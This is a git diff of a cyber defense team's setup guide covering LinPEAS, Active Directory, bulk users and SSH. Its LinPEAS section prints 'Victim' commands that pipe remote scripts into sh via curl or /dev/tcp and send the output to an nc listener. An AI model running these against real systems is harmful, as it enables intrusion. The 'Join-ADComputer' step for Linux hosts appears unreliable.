@@ -263,49 +263,49 @@ OpenVAS is a comprehensive vulnerability scanning tool that detects security iss
 LinPEAS is not specifically a vulnerability scanner in the traditional sense, but rather a tool for identifying potential security weaknesses and paths to escalate privileges on Linux systems. It can be useful for incident response by providing you with information of vulnerable or weak areas to patch or secure.
 
  From github
-```bash
+  ```bash
   curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
  Without curl
   ```bash
   python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
-```
-```bash
+  ```
+  ```bash
   python3 -c "import urllib.request; urllib.request.urlretrieve('https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')"
   ```
  Local network
    ```bash
   sudo python3 -m http.server 80 #Host
    ```
-```bash
+  ```bash
   curl 10.10.10.10/linpeas.sh | sh #Victim
   ```
 
  Without curl
   ```bash
   sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
-```
-```bash
+  ```
+  ```bash
   cat < /dev/tcp/10.10.10.10/80 | sh #Victim
-```
+  ```
 
 Excute from memory and send output back to the host
   ```bash
   nc -lvnp 9002 | tee linpeas.out #Host
-```
-```bash
+  ```
+  ```bash
   curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
-```
+  ```
 
 Use a linpeas binary
   ```bash
   wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
-```
-```bash
+  ```
+  ```bash
   chmod +x linpeas_linux_amd64
-```
-```bash
+  ```
+  ```bash
   ./linpeas_linux_amd64
   ```
 
@@ -331,59 +331,89 @@ You will be prompt to enter your current password followed by being asked to ent
 <img src="https://itslinuxfoss.com/wp-content/uploads/2023/02/image-995.png">
 
 <br>
+
 ---
 ## Configuring Active Directory
- ###  Powershell
+
 Using powershell to join hosts to the domain can be efficiently especially for tasks that involve automation and scripting. PowerShell provides cmdlets specifically designed for managing Active Directory and performing domain join operations. This provides a more straightforward approach in setting up the AD server however may vary slightly depending on 
 Here's how you can set up AD and join hosts to the domain using PowerShell:
 
-#### Setting up Active Directory:
+### Setting up Active Directory:
 
-1. Press Windows + R to open the run dialog and type `powershell`
- <img src="https://i.imgur.com/7lJhgAb.png">  
-2. Enter Crtrl+Shift+Enter to run as administrator
-   
-4. Use the `Install-WindowsFeature` cmdlet to install the Active Directory Domain Services role:
-    ```powershell
-       Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
+1. Search powershell in Start Menu
+2. Right-click and run as administrator
+
+3. Use the `Install-WindowsFeature` cmdlet to install the Active Directory Domain Services role:
+
+   ```powershell
+   Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
 
 5. Use the `Install-ADDSForest` cmdlet to promote the server to a domain controller:
-    ```powershell
-       Install-ADDSForest -DomainName "isucdc.com" -DomainNetbiosName "ISUCDC" -ForestMode "WinThreshold" -DomainMode "WinThreshold" -InstallDns -Force
 
-7. Use the `Set-ADDirectoryServicesRestoreModePassword` cmdlet to set the Directory Services Restore Mode (DSRM) password:
    ```powershell
-       Set-ADDirectoryServicesRestoreModePassword -NewPassword (ConvertTo-SecureString -AsPlainText "YourDSRMPassword" -Force)
+   Install-ADDSForest -DomainName "isucdc.com" -DomainNetbiosName "ISUCDC" -ForestMode "WinThreshold" -DomainMode "WinThreshold" -InstallDns -Force
 
-8. After promoting the server to a domain controller, restart the server to complete the process.
+- Note: For Testing purposes in your own network substitute with the following, be sure to have a password set for both you and the admin account:
+  
+  ```powershell
+     Install-ADDSForest -DomainName "mylab.local" -CreateDnsDelegation:$false -DomainNetBiosName "mylab" -InstallDns:$true
+  ```
+  
+6. Use the `Set-ADDirectoryServicesRestoreModePassword` cmdlet to set the Directory Services Restore Mode (DSRM) password:
+  
+   ```powershell
+   Set-ADDirectoryServicesRestoreModePassword -NewPassword (ConvertTo-SecureString -AsPlainText "YourDSRMPassword" -Force)
 
-### Joining Hosts to Active Directory:
+7. After promoting the server to a domain controller, restart the server to complete the process.
+<br>
+ 
+ ### Joining Hosts to Active Directory:
 
-Joining Windows Hosts:
+  Joining Windows Hosts:
    - Use the `Add-Computer` cmdlet to join a Windows host to the domain:
-     ```powershell
-     Add-Computer -DomainName "isucdc.com" -Credential Get-Credential
-     ```
-Joining Linux Hosts:
-   - Install the necessary PowerShell modules for managing Linux systems (e.g., `PowerShellGet`, `PackageManagement`).
-   - Join the Linux host to the domain using the `Join-ADComputer` cmdlet:
-     ```powershell
-     Join-ADComputer -Server "DC1.isucdc.com" -Credential (Get-Credential) -Name "LinuxHost01"
-     ```
+   
+   ```powershell
+   Add-Computer -DomainName "isucdc.com" -Credential Get-Credential
+   ```
+     
+  Joining Linux Hosts:
+   1. Install the necessary PowerShell modules for managing Linux systems (e.g., `PowerShellGet`, `PackageManagement`).
+   2. Join the Linux host to the domain using the `Join-ADComputer` cmdlet:
+  ```powershell
+  Join-ADComputer -Server "DC1.isucdc.com" -Credential (Get-Credential) -Name "LinuxHost01"
+  ```     
 
-### Verify Domain Join**:
+#### Verify Domain Join:
 Windows Hosts:
   - You can use the `Get-ComputerInfo` cmdlet to retrieve information about the domain status on Windows hosts:
+    
     ```powershell
     Get-ComputerInfo -Property 'DomainJoined'
     ```
+    
   - This command will return whether the computer is joined (`True`) or not joined (`False`).
 
 Linux Hosts:
   - Realm list is a native command that displays all the realms that the system in joined to including AD
+    
     ```bash
     realm list
     ```
+
+### Bulk user, organizational unit, and group creation
+Within the Active directory folder of the github repo there are exists a Powershell script to mass import users as well as a spreadsheet that you can use as a template to fill with your own users
+1. Download the folder onto your Windows server
+<img src="https://activedirectorypro.com/wp-content/uploads/2022/09/powershell_scripts_c_drive.webp">
+2. First we will create an organizational unit, modify the ous.csv file to reflect your CDC user roles and save
+<img src="https://i.imgur.com/3y85x0M.png">
+4. From the start menu search Windows Powershell ISE, right click and run as administrator
+5. Click File > Open > create_ous.ps1 and run the file
+<img src="https://activedirectorypro.com/wp-content/uploads/2022/09/create-ous-powershell-1.webp">
+6. Repeat the same process for groups and users by updating the csv file and running the code
+7. Confirm the program ran succsessfully by running the following command in powershell:
+  ```powershell
+   Get-ADUser -filter * -Properties * | Select name, department, title | out-gridview
+````
 
 ----
 ## Enabling SSH on port 22
@@ -456,8 +486,8 @@ SSH other wise known as the secure shell allows a user a secure way to remotely 
 
 Uncomment by removing the # at the beginning of the line if necessary.
 
-9. Enter Ctrl+S and Ctrl+X to save and exit
-10. Apply the changes by restaring the service
+9. Enter Ctrl+S and Ctrl+X to save and exit.
+10. Apply the changes by restaring the service:
 
         sudo systemctl restart sshd
 
@@ -465,6 +495,22 @@ Uncomment by removing the # at the beginning of the line if necessary.
 
           ssh username@xx.xx.xx -p 22
 
+### Windows
+1. Search powershell in Start Menu
+2. Right-click and run as administrator
+3. Enter the following command exactly as written:
+  ```powershell
+  Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+  ```
+  - Note the sshd_config file will only generate once the service is started
+4. Type the following command to start the service:
+   ```powershell
+   Start-Service sshd
+   ```
+5. To configure your SSH settings it can be found in the `sshd_config` file within you `C:ProgramData\ssh` directory
+   <img src="https://i.imgur.com/aBzSN2T.png">
+ 
+  
 ## Configuring a Firewall
 ## Configuring VLAN
 ## Configuring an Intrusion Detection System
